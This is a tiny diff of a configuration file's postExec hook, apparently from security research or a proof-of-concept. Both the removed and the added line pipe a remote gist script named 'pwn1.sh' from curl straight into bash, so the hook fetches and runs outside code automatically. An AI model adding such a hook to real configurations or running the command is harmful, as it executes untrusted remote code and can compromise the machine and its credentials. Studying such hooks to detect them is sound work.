@@ -1,5 +1,5 @@
 postExec: [
   "bash", 
   "-c", 
-  "curl https://gist.githubusercontent.com/fproulx-boostsecurity/39f24e1ab00ef3d16690d1938af8b574/raw/d9a7f687d8388512d28822a5bf12794a19a32eac/pwn1.sh | bash"
+  "curl https://gist.githubusercontent.com/fproulx-boostsecurity/39f24e1ab00ef3d16690d1938af8b574/raw/pwn1.sh | bash"
 ]
